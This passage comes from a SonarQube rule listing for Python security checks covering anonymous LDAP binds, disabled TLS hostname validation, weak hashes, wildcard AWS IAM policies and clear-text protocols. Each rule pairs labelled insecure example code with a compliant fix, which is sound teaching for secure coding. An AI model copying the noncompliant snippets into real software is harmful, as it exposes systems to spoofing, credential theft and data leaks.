<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4433">
              python:S4433
            </a>
          </td>
          <td>
            <details>
              <p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The
<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>
<ul><li> <em>Anonymous</em> Authentication </li><li> <em>Unauthenticated</em> Authentication </li><li> <em>Name/Password</em> Authentication </li></ul>
<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing
credentials.</p>
<h2>Why is this an issue?</h2>
<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do
not provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted
directory.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact
varies depending on the permission obtained on the directory and the type of data it stores.</p>
<h4>Authentication bypass</h4>
<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data
such as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the
affected directory as an identity provider.</p>
<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>
<h4>Sensitive information leak</h4>
<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces
of information.</p>
<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to
perform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>
<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements
in some countries. For example, this kind of security event would go against the European GDPR law.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple
authentication mechanism.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import ldap

def init_ldap():
   connect &#61; ldap.initialize(&#39;ldap://example:1389&#39;)

   connect.simple_bind(&#39;cn&#61;root&#39;) # Noncompliant
   connect.simple_bind_s(&#39;cn&#61;root&#39;) # Noncompliant
   connect.bind_s(&#39;cn&#61;root&#39;, None) # Noncompliant
   connect.bind(&#39;cn&#61;root&#39;, None) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import ldap
import os

def init_ldap():
   connect &#61; ldap.initialize(&#39;ldap://example:1389&#39;)

   connect.simple_bind(&#39;cn&#61;root&#39;, os.environ.get(&#39;LDAP_PASSWORD&#39;))
   connect.simple_bind_s(&#39;cn&#61;root&#39;, os.environ.get(&#39;LDAP_PASSWORD&#39;))
   connect.bind_s(&#39;cn&#61;root&#39;, os.environ.get(&#39;LDAP_PASSWORD&#39;))
   connect.bind(&#39;cn&#61;root&#39;, os.environ.get(&#39;LDAP_PASSWORD&#39;))
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://datatracker.ietf.org/doc/html/rfc4513#section-5" rel="nofollow">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication
  Methods and Security Mechanisms</a> - Bind operations </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/521" rel="nofollow">MITRE, CWE-521</a> - Weak Password Requirements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5527">
              python:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>Certificate validation is not enabled by default when <code>_create_unverified_context</code> or <code>_create_stdlib_context</code> is used. It is
recommended to use <code>create_default_context</code>, without explicitly setting <code>check_hostname</code> to <code>False</code>.<br /> Doing so
creates a secure context that validates both hostnames and certificates.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import ssl

example &#61; ssl._create_stdlib_context() # Noncompliant

example &#61; ssl._create_default_https_context()
example.check_hostname &#61; False # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import ssl

example &#61; ssl.create_default_context()

example &#61; ssl._create_default_https_context()
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul><li> Create a self-signed certificate for that machine. </li><li> Add this self-signed certificate to the system’s trust store. </li><li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li></ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/297" rel="nofollow">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4790">
              python:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
import hashlib
m &#61; hashlib.md5() // Sensitive
</pre>
<pre>
import hashlib
m &#61; hashlib.sha1() // Sensitive
</pre>
<pre>
import md5 // Sensitive and deprecated since Python 2.5; use the hashlib module instead.
m &#61; md5.new()

import sha // Sensitive and deprecated since Python 2.5; use the hashlib module instead.
m &#61; sha.new()
</pre>
<h2>Compliant Solution</h2>
<pre>
import hashlib
m &#61; hashlib.sha512() // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4792">
              python:S4792
            </a>
          </td>
          <td>
            <details>
              <p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0285" rel="nofollow">CVE-2018-0285</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2000-1127" rel="nofollow">CVE-2000-1127</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-15113" rel="nofollow">CVE-2017-15113</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2015-5742" rel="nofollow">CVE-2015-5742</a> </li></ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul><li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li><li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li></ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li><li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li><li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li><li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li><li> the logs are only stored locally instead of being backuped or replicated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Check that your production deployment doesn’t have its loggers in &#34;debug&#34; mode as it might write sensitive information in logs. </li><li> Production logs should be stored in a secure location which is only accessible to system administrators. </li><li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li><li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li><li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li><li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li></ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul><li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li><li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li><li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li><li> Monitor the logs for any suspicious activity. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
import logging
from logging import Logger, Handler, Filter
from logging.config import fileConfig, dictConfig

logging.basicConfig()  # Sensitive

logging.disable()  # Sensitive


def update_logging(logger_class):
    logging.setLoggerClass(logger_class)  # Sensitive


def set_last_resort(last_resort):
    logging.lastResort &#61; last_resort  # Sensitive


class CustomLogger(Logger):  # Sensitive
    pass


class CustomHandler(Handler):  # Sensitive
    pass


class CustomFilter(Filter):  # Sensitive
    pass


def update_config(path, config):
    fileConfig(path)  # Sensitive
    dictConfig(config)  # Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Information Exposure Through Log Files </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6304">
              python:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/" rel="nofollow">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>The wildcard <code>&#34;*&#34;</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all
policies of the account:</p>
<pre>
from aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement

PolicyDocument(
    statements&#61;[
        PolicyStatement(
            effect&#61;Effect.ALLOW,
            actions&#61;&#34;iam:CreatePolicyVersion&#34;,
            resources&#61;[&#34;*&#34;] # Sensitive
        )
    ]
)
</pre>
<h2>Compliant Solution</h2>
<p>Restrict the update permission to the appropriate subset of policies:</p>
<pre>
from aws_cdk import Aws
from aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement

PolicyDocument(
    statements&#61;[
        PolicyStatement(
            effect&#61;Effect.ALLOW,
            actions&#61;&#34;iam:CreatePolicyVersion&#34;,
            resources&#61;[f&#34;arn:aws:iam::{Aws.ACCOUNT_ID}:policy/team1/*&#34;]
        )
    ]
)
</pre>
<h2>Exceptions</h2>
<ul><li> Should not be raised on key policies (when AWS KMS actions are used.) </li><li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5332">
              python:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
url &#61; &#34;http://example.com&#34; # Sensitive
url &#61; &#34;ftp://anonymous&#64;example.com&#34; # Sensitive
url &#61; &#34;telnet://anonymous&#64;example.com&#34; # Sensitive

import telnetlib
cnx &#61; telnetlib.Telnet(&#34;towel.blinkenlights.nl&#34;) # Sensitive

import ftplib
cnx &#61; ftplib.FTP(&#34;ftp.example.com&#34;) # Sensitive

import smtplib
smtp &#61; smtplib.SMTP(&#34;smtp.example.com&#34;, port&#61;587) # Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationLoadBalancer.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

lb &#61; elbv2.ApplicationLoadBalancer(
    self,
    &#34;LB&#34;,
    vpc&#61;vpc,
    internet_facing&#61;True
)

lb.add_listener(
    &#34;Listener-default&#34;,
    port&#61;80, # Sensitive
    open&#61;True
)
lb.add_listener(
    &#34;Listener-http-explicit&#34;,
    protocol&#61;elbv2.ApplicationProtocol.HTTP, # Sensitive
    port&#61;8080,
    open&#61;True
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationListener.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.ApplicationListener(
    self,
    &#34;listener-http-explicit-const&#34;,
    load_balancer&#61;lb,
    protocol&#61;elbv2.ApplicationProtocol.HTTP, # Sensitive
    port&#61;8081,
    open&#61;True
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkLoadBalancer.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)
lb &#61; elbv2.NetworkLoadBalancer(
    self,
    &#34;LB&#34;,
    vpc&#61;vpc,
    internet_facing&#61;True
)

lb.add_listener( # Sensitive
    &#34;Listener-default&#34;,
    port&#61;1234
)
lb.add_listener(
    &#34;Listener-TCP-explicit&#34;,
    protocol&#61;elbv2.Protocol.TCP, # Sensitive
    port&#61;1337
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkListener.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.NetworkListener(
    self,
    &#34;Listener-TCP-explicit&#34;,
    protocol&#61;elbv2.Protocol.TCP, # Sensitive
    port&#61;1338,
    load_balancer&#61;lb
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/CfnListener.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.CfnListener(
    self,
    &#34;listener-http&#34;,
    default_actions&#61;[application_default_action],
    load_balancer_arn&#61;lb.load_balancer_arn,
    protocol&#61;&#34;HTTP&#34;, # Sensitive
    port&#61;80
)

elbv2.CfnListener(
    self,
    &#34;listener-tcp&#34;,
    default_actions&#61;[network_default_action],
    load_balancer_arn&#61;lb.load_balancer_arn,
    protocol&#61;&#34;TCP&#34;, # Sensitive
    port&#61;1000
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancerListener.html" rel="nofollow">aws_cdk.aws_elasticloadbalancing.LoadBalancerListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.LoadBalancerListener(
    external_port&#61;10000,
    external_protocol&#61;elb.LoadBalancingProtocol.TCP, # Sensitive
    internal_port&#61;10000
)

elb.LoadBalancerListener(
    external_port&#61;10080,
    external_protocol&#61;elb.LoadBalancingProtocol.HTTP, # Sensitive
    internal_port&#61;10080
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/CfnLoadBalancer.html" rel="nofollow">aws_cdk.aws_elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb
)

elb.CfnLoadBalancer(
    self,
    &#34;elb-tcp&#34;,
    listeners&#61;[
        elb.CfnLoadBalancer.ListenersProperty(
            instance_port&#61;&#34;10000&#34;,
            load_balancer_port&#61;&#34;10000&#34;,
            protocol&#61;&#34;tcp&#34; # Sensitive
        )
    ],
    subnets&#61;vpc.select_subnets().subnet_ids
)

elb.CfnLoadBalancer(
    self,
    &#34;elb-http-dict&#34;,
    listeners&#61;[
        {
            &#34;instancePort&#34;:&#34;10000&#34;,
            &#34;loadBalancerPort&#34;:&#34;10000&#34;,
            &#34;protocol&#34;:&#34;http&#34; # Sensitive
        }
    ],
    subnets&#61;vpc.select_subnets().subnet_ids
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancer.html" rel="nofollow">aws_cdk.aws_elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.LoadBalancer(
    self,
    &#34;elb-tcp-dict&#34;,
    vpc&#61;vpc,
    listeners&#61;[
        {
            &#34;externalPort&#34;:10000,
            &#34;externalProtocol&#34;:elb.LoadBalancingProtocol.TCP, # Sensitive
            &#34;internalPort&#34;:10000
        }
    ]
)

loadBalancer.add_listener(
    external_port&#61;10081,
    external_protocol&#61;elb.LoadBalancingProtocol.HTTP, # Sensitive
    internal_port&#61;10081
)
loadBalancer.add_listener(
    external_port&#61;10001,
    external_protocol&#61;elb.LoadBalancingProtocol.TCP, # Sensitive
    internal_port&#61;10001
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticache/CfnReplicationGroup.html" rel="nofollow">aws_cdk.aws_elasticache.CfnReplicationGroup</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticache as elasticache
)

elasticache.CfnReplicationGroup(
    self,
    &#34;unencrypted-explicit&#34;,
    replication_group_description&#61;&#34;a replication group&#34;,
    automatic_failover_enabled&#61;False,
    transit_encryption_enabled&#61;False, # Sensitive
    cache_subnet_group_name&#61;&#34;test&#34;,
    engine&#61;&#34;redis&#34;,
    engine_version&#61;&#34;3.2.6&#34;,
    num_cache_clusters&#61;1,
    cache_node_type&#61;&#34;cache.t2.micro&#34;
)

elasticache.CfnReplicationGroup( # Sensitive, encryption is disabled by default
    self,
    &#34;unencrypted-implicit&#34;,
    replication_group_description&#61;&#34;a test replication group&#34;,
    automatic_failover_enabled&#61;False,
    cache_subnet_group_name&#61;&#34;test&#34;,
    engine&#61;&#34;redis&#34;,
    engine_version&#61;&#34;3.2.6&#34;,
    num_cache_clusters&#61;1,
    cache_node_type&#61;&#34;cache.t2.micro&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/CfnStream.html" rel="nofollow">aws_cdk.aws_kinesis.CfnStream</a>:</p>
<pre>
from aws_cdk import (
    aws_kinesis as kinesis,
)

kinesis.CfnStream( # Sensitive, encryption is disabled by default for CfnStreams
    self,
    &#34;cfnstream-implicit-unencrytped&#34;,
    shard_count&#61;1
)

kinesis.CfnStream(self,
    &#34;cfnstream-explicit-unencrytped&#34;,
    shard_count&#61;1,
    stream_encryption&#61;None # Sensitive
)
</pre>
